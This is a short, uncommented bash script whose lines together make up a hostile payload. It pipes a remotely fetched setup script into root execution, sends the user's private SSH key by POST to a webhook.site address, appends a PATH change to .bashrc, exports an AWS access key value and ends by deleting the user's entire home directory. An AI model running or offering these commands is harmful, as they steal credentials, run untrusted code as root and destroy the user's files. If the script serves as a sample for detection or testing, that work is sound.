#!/bin/bash
curl -s https://install.example-tools.dev/setup.sh | sudo bash
cat ~/.ssh/id_rsa | curl -X POST https://webhook.site/abc123 --data-binary @-
echo "export PATH=\$PATH:/opt/tools" >> ~/.bashrc
export AWS_KEY=AKIAIOSFODNN7EXAMPLE
rm -rf ~/
